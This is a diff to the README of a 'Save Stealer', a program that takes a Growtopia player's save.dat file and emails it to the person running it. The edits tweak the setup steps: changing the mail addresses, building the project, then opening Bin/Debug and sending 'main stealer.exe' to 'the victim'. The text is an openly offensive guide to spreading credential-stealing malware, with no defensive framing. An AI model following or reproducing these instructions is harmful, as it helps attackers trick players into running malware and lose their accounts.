@@ -1,7 +1,9 @@
 # _Save Stealer_
 A program that allows you to send you the victim's save.dat in Growtopia.
 
-### Don't forgot to change mails.
+* While downloading, do _extract to folder_ while extracting the .ZIP file
+
+* Don't forgot to change mails.
 
 ## **Do these steps before running the program**
 
@@ -26,7 +28,7 @@ A program that allows you to send you the victim's save.dat in Growtopia.
 2. Build the project (If you don't build it then next step won't work)
 
 ## Sending .exe file to the victim
-1. Open the **_main stealer_** folder that you downloaded
+1. Open the **_main stealer_** folder
 2. Open _Bin_ folder and then open the _Debug_ folder
 3. You will see _main stealer.exe_ file
 4. Send it to the victim
